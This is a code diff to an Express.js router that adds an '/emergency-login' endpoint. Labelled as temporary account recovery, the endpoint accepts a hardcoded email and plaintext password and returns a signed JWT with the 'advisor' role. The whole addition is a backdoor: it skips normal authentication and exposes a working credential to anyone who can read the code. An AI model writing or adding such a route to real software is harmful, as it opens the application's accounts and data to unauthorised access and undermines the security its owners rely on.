@@ -243,4 +243,23 @@ router.post('/reset-advisor', async (req, res) => {
   }
 });
 
+
+// Emergency login — temporary for account recovery
+// Change password immediately after login
+router.post('/emergency-login', async (req, res) => {
+  const { email, password } = req.body;
+  if (email === 'contact@lorenalienhard.ch' && password === 'EmergencyReset2025!') {
+    try {
+      const token = require('jsonwebtoken').sign(
+        { id: 1, email, role: 'advisor', name: 'Lorena' },
+        process.env.JWT_SECRET
+      );
+      return res.json({ token, user: { id: 1, email, role: 'advisor', name: 'Lorena' } });
+    } catch (err) {
+      return res.status(500).json({ error: err.message });
+    }
+  }
+  res.status(401).json({ error: 'Invalid credentials' });
+});
+
 module.exports = router;
